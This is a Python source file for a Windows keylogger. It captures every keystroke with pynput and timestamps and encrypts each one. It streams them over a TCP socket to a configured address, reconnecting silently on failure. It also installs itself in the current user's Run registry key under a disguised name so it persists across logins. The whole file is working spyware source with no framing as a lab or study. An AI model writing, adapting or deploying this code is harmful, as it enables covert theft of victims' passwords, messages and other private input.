import socket
from pynput import keyboard
from cryptography.fernet import Fernet
import winreg
import ast
import sys
from datetime import datetime
import time
import yaml

IP = "127.0.0.1"
VALUE_NAME = "RegeditName"

with open("cryptokey.txt", "r", encoding="utf-8") as f:
    key_bytes = ast.literal_eval(f.read())
    cipher = Fernet(key_bytes)

with open("config.yaml", "r") as f:
    config = yaml.safe_load(f)
    PORT = config["general"]["port"]

socket_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def autostart_on():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        exe_path = sys.executable + ' "' + __file__ + '"'
        winreg.SetValueEx(key, VALUE_NAME, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except:
        pass

def connect_socket():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((IP, PORT))
            return sock
        except:
            time.sleep(5)

socket_c = connect_socket()
autostart_on()

def on_press(key):
    global socket_c
    try:
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        key_char = key.char
        data = f"{timestamp} {key_char}"
        encrypted = cipher.encrypt(data.encode())
        socket_c.send(encrypted + b'\n')
    except AttributeError:
        special = {
            keyboard.Key.space: "Space",
            keyboard.Key.ctrl_l: "Left CTRL",
            keyboard.Key.ctrl_r: "Right CTRL",
            keyboard.Key.alt_l: "Left ALT",
            keyboard.Key.alt_r: "Right ALT",
            keyboard.Key.tab: "TAB",
            keyboard.Key.shift_l: "Left SHIFT",
            keyboard.Key.shift_r: "Right SHIFT",
            keyboard.Key.enter: "Enter",
            keyboard.Key.esc: "Escape",
            keyboard.Key.cmd: "WIN"
        }

        if key in special:
            data = f"{timestamp} {special[key]}"
            encrypted = cipher.encrypt(data.encode())
            socket_c.send(encrypted + b'\n')
    except (BrokenPipeError, ConnectionError, ConnectionAbortedError):
        socket_c.close()
        socket_c = connect_socket()

Listener = keyboard.Listener(on_press=on_press)
Listener.start()
Listener.join()
socket_c.close()
